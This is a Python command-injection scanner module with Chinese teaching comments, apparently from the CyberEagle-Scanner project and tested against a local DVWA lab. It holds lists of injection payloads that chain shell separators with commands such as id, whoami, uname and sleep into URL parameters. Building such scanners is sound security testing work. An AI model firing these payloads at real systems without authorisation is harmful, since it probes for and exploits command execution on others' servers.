#!/usr/bin/env python3
"""
命令注入检测模块
支持两种检测方式：
1. 回显检测（Echo-based）：通过命令输出特征判断
2. 延时检测（Time-based）：通过响应时间延迟判断

命令注入原理：
用户输入被直接拼接到系统命令中，Shell 将 ;、&&、| 等识别为命令分隔符，
导致攻击者可以执行额外的系统命令。
"""

import requests
import threading
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import re

# 控制台颜色（ANSI转义序列）
GREEN = '\033[92m'      # 绿色（成功/发现漏洞）
RED = '\033[91m'        # 红色（错误）
YELLOW = '\033[93m'     # 黄色（警告）
BLUE = '\033[94m'       # 蓝色（信息）
CYAN = '\033[96m'       # 青色（提示）
RESET = '\033[0m'       # 重置颜色，回到默认终端颜色


class CmdScanner:
    """
    命令注入检测器类
    
    支持两种注入检测方式：
    1. 回显检测（Echo-based）     → 适合命令输出回显到页面的场景
    2. 延时检测（Time-based）      → 适合页面无回显的场景
    
    常见命令分隔符：
    - ;    : 顺序执行，无论前一条是否成功
    - &&   : 前一条成功才执行后一条
    - ||   : 前一条失败才执行后一条
    - |    : 管道，将前输出作为后输入
    - &    : 后台执行
    """

    def __init__(self, base_url, threads=10, timeout=5, verbose=False, delay=0.1, cookies=None):
        """
        初始化扫描器
        
        参数：
            base_url: 目标URL
            threads: 线程数
            timeout: 请求超时（秒）
            verbose: 是否显示详细输出
            delay: 每次请求间隔（秒），避免触发WAF
            cookies: 字典形式的Cookie（用于保持登录状态）
        """
        # self 相当于 C 语言里的 this，指代当前对象
        
        # 去掉 URL 末尾的斜杠，防止拼接时出现双斜杠
        self.base_url = base_url.rstrip('/')
        
        # 保存参数到对象内部（成员变量）
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.delay = delay

        # 创建一个"会话"对象（相当于一个浏览器标签页）
        # 它可以自动保存 Cookie，复用 TCP 连接，比每次新建请求快
        self.session = requests.Session()
        
        # 设置请求头中的 User-Agent，伪装成真实浏览器（避免被网站拒绝）
        self.session.headers.update({
            'User-Agent': 'CyberEagle-Scanner/0.2.0 (https://github.com/yukon61/CyberEagle-Scanner)'
        })

        # 如果用户传入了 cookies，就把它们加入到会话中（相当于手动设置 Cookie）
        if cookies:
            self.session.cookies.update(cookies)

        # 准备一个空列表，用来存放检测到的漏洞结果
        self.results = []
        
        # 创建一个线程锁（防止多个线程同时修改 results 列表导致数据混乱）
        # 相当于 C 语言的 pthread_mutex_t
        self.lock = threading.Lock()

        # ---------- 命令回显特征关键词 ----------
        # 用于检测命令执行后的输出是否出现在页面中
        self.echo_keywords = [
            # Linux 用户信息
            'uid=', 'gid=', 'groups=',
            'www-data', 'root', 'nobody',
            # Linux 系统信息
            'Linux', 'GNU', 'kernel',
            # Windows 用户信息
            'nt authority', 'system32',
            # 常见命令输出
            'bin', 'boot', 'dev', 'etc', 'home', 'var',
            'usr', 'lib', 'tmp', 'opt', 'srv',
            # whoami 输出
            'user', 'administrator',
            # id 输出格式
            'uid', 'gid',
            # uname 输出
            'x86_64', 'i386', 'arm',
        ]

    def get_url_params(self, url):
        """
        提取URL中的查询参数
        
        例如：http://a.com/page.php?id=1&name=test
        返回：{'id': '1', 'name': 'test'}
        """
        # urlparse 解析 URL，分离出路径、查询字符串等
        parsed = urlparse(url)
        # parse_qs 把查询字符串解析成字典，值为列表（因为可能有多个同名参数）
        params = parse_qs(parsed.query)
        # 把列表转换成单个值（取第一个元素）
        return {k: v[0] if v else '' for k, v in params.items()}

    def build_payload_url(self, url, param, payload):
        """
        构造带 payload 的测试 URL
        
        例如：
            url = "http://a.com/page.php?ip=127.0.0.1"
            param = "ip"
            payload = "127.0.0.1; id"
            → "http://a.com/page.php?ip=127.0.0.1;%20id"
        """
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        # 替换目标参数的值
        query_params[param] = [payload]
        
        # 重新构建查询字符串
        new_query = urlencode(query_params, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        return new_url

    def contains_echo_keyword(self, text):
        """
        检查响应内容是否包含命令回显特征关键词
        """
        text_lower = text.lower()
        for keyword in self.echo_keywords:
            if keyword.lower() in text_lower:
                return True
        return False

    # ==================== 回显检测 ====================
    
    def is_command_injection_echo(self, url, param):
        """
        回显命令注入检测
        
        原理：注入命令分隔符 + 系统命令，
        如果响应中包含命令输出的特征关键词，说明存在命令注入。
        
        常用命令分隔符：
        - ;    : 顺序执行（Linux/Windows 通用）
        - &&   : 逻辑与（前成功则执行后）
        - ||   : 逻辑或（前失败则执行后）
        - |    : 管道（前输出作为后输入）
        
        常用测试命令：
        - id      : 显示用户ID（Linux）
        - whoami  : 显示当前用户名（Linux/Windows）
        - uname -a: 显示系统信息（Linux）
        - dir     : 显示目录列表（Windows）
        """
        # 常见命令注入 Payload
        # 格式：正常输入 + 分隔符 + 系统命令
        # 注意：DVWA 的命令注入关卡输入的是 IP 地址，所以基准是 127.0.0.1
        payloads = [
            # ---- 使用 ; 分隔符（最通用） ----
            "127.0.0.1; id",
            "127.0.0.1; whoami",
            "127.0.0.1; uname -a",
            "127.0.0.1; ls",
            "127.0.0.1; pwd",
            "127.0.0.1; echo test123",
            
            # ---- 使用 && 分隔符（前成功则执行后） ----
            "127.0.0.1 && id",
            "127.0.0.1 && whoami",
            "127.0.0.1 && uname -a",
            
            # ---- 使用 || 分隔符（前失败则执行后） ----
            "127.0.0.1 || id",
            "127.0.0.1 || whoami",
            
            # ---- 使用 | 管道（前输出作为后输入） ----
            "127.0.0.1 | id",
            "127.0.0.1 | whoami",
            
            # ---- 使用 & 后台执行 ----
            "127.0.0.1 & id",
            
            # ---- 使用 $( ) 命令替换 ----
            "127.0.0.1$(id)",
            "127.0.0.1`id`",
        ]
        
        for payload in payloads:
            # 构造测试 URL
            test_url = self.build_payload_url(url, param, payload)
            
            # 添加延迟，防止触发WAF
            time.sleep(self.delay)
            
            try:
                resp = self.session.get(test_url, timeout=self.timeout)
                
                # 检查响应是否包含命令回显特征关键词
                if self.contains_echo_keyword(resp.text):
                    return True, payload, test_url, '命令回显被检测到'
                    
            except Exception as e:
                if self.verbose:
                    print(f"  [调试] {param}={payload} 请求失败: {e}")
                continue
        
        return False, None, None, None

    # ==================== 延时检测 ====================
    
    def is_command_injection_time(self, url, param, sleep_seconds=5):
        """
        延时命令注入检测
        
        原理：注入 sleep 5 等延时命令，
        如果响应时间超过 sleep 时间，说明存在命令注入。
        
        常用延时命令：
        - sleep 5    : Linux 延时 5 秒
        - ping -n 5 127.0.0.1 : Windows 延时（约5秒）
        - timeout 5  : Linux 超时命令
        """
        # 延时命令 Payload
        time_payloads = [
            # ---- Linux sleep ----
            f"127.0.0.1; sleep {sleep_seconds}",
            f"127.0.0.1 && sleep {sleep_seconds}",
            f"127.0.0.1 | sleep {sleep_seconds}",
            f"127.0.0.1 || sleep {sleep_seconds}",
            
            # ---- Linux ping 延时 ----
            f"127.0.0.1; ping -c {sleep_seconds} 127.0.0.1",
            f"127.0.0.1 && ping -c {sleep_seconds} 127.0.0.1",
            
            # ---- 命令替换延时 ----
            f"127.0.0.1$(sleep {sleep_seconds})",
            f"127.0.0.1`sleep {sleep_seconds}`",
        ]
        
        # 基线请求（不带 payload，测量正常响应时间）
        try:
            start = time.time()
            self.session.get(url, timeout=self.timeout + 5)
            baseline_time = time.time() - start
        except:
            baseline_time = 0.5  # 默认基线
        
        for payload in time_payloads:
            test_url = self.build_payload_url(url, param, payload)
            
            time.sleep(self.delay)
            
            try:
                start = time.time()
                self.session.get(test_url, timeout=self.timeout + sleep_seconds + 2)
                elapsed = time.time() - start
                
                # 如果响应时间显著大于基线（至少 sleep_seconds 秒）
                if elapsed > baseline_time + sleep_seconds * 0.5:
                    return True, payload, test_url, elapsed
                    
            except requests.exceptions.Timeout:
                # 超时本身也可能说明存在时间盲注
                return True, payload, test_url, sleep_seconds + self.timeout
            except Exception as e:
                if self.verbose:
                    print(f"  [调试] 延时检测失败: {e}")
                continue
        
        return False, None, None, None

    # ==================== 主扫描函数 ====================
    
    def scan(self):
        """
        执行完整的命令注入扫描
        
        流程：
        1. 提取 URL 中的查询参数
        2. 对每个参数依次执行两种检测：
           - 回显检测（Echo-based）
           - 延时检测（Time-based）
        3. 输出检测结果
        """
        print(f"\n[+] 开始命令注入检测")
        print(f"[+] 目标: {self.base_url}")
        print(f"[+] 线程数: {self.threads}")
        print("-" * 60)
        
        # ---- 第1步：提取 URL 参数 ----
        params = self.get_url_params(self.base_url)
        if not params:
            print("[!] 未检测到 URL 参数")
            return []
        
        print(f"[+] 发现 {len(params)} 个 URL 参数: {list(params.keys())}")
        
        results = []
        
        # ---- 第2步：对每个参数进行检测 ----
        for param, value in params.items():
            print(f"\n[*] 测试参数: {param} = {value}")
            
            # ---------- 回显检测 ----------
            print("  [->] 回显命令注入检测...", end='', flush=True)
            is_vuln, payload, test_url, detail = self.is_command_injection_echo(self.base_url, param)
            if is_vuln:
                print(f" {GREEN}✅ 发现回显命令注入!{RESET}")
                results.append({
                    'type': 'echo-based',
                    'param': param,
                    'payload': payload,
                    'url': test_url,
                    'details': detail
                })
                # 已发现漏洞，跳过延时检测（可选）
                continue
            else:
                print(" ❌ 未发现")

            # ---------- 延时检测 ----------
            print("  [->] 延时命令注入检测...", end='', flush=True)
            is_vuln, payload, test_url, elapsed = self.is_command_injection_time(self.base_url, param)
            if is_vuln:
                print(f" {GREEN}✅ 发现延时命令注入!{RESET}")
                print(f"      响应时间: {elapsed:.2f}s")
                results.append({
                    'type': 'time-based',
                    'param': param,
                    'payload': payload,
                    'url': test_url,
                    'details': f'响应延迟 {elapsed:.2f}s'
                })
            else:
                print(" ❌ 未发现")
        
        # ---- 第3步：打印总结 ----
        print("\n" + "-" * 60)
        print(f"[+] 命令注入检测完成！共发现 {len(results)} 个疑似漏洞")
        
        for r in results:
            print(f"  {GREEN}✅{RESET} [{r['type']}] {r['param']} -> {r['details']}")
            print(f"     Payload: {r['payload'][:60]}")
        
        return results


# ==================== 独立测试 ====================
if __name__ == "__main__":
    # 测试DVWA的命令注入关卡
    scanner = CmdScanner(
        base_url="http://127.0.0.1/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit",
        verbose=True
    )
    results = scanner.scan()
